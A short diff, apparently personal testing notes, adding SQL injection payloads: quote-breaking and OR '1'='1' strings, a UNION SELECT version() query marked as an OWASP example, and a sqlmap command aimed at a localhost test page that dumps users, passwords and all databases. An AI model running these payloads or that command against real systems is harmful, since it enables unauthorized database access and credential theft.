@@ -1,0 +1,9 @@
+1'"); die("'lof
+1' OR '1'='1') ORDER BY id DESC LIMIT 1 --
+1' OR '1'='1') --
+Petr, ':id' => 1]);//
+Example 2 OWASP
+SELECT * FROM `Names` WHERE `First name`='Petr' UNION SELECT 1,version() limit 1,1
+
+
+sqlmap -v4 -u "http://localhost/test/index.php?q=1&p=2" --randomize=? --threads=3 --dbms=Mysql --invalid-logical --invalid-string --prefix=? --suffix=? --level=5 --risk=3 -f -a -b --dbs --tables --users --passwords --columns --schema --dump-all
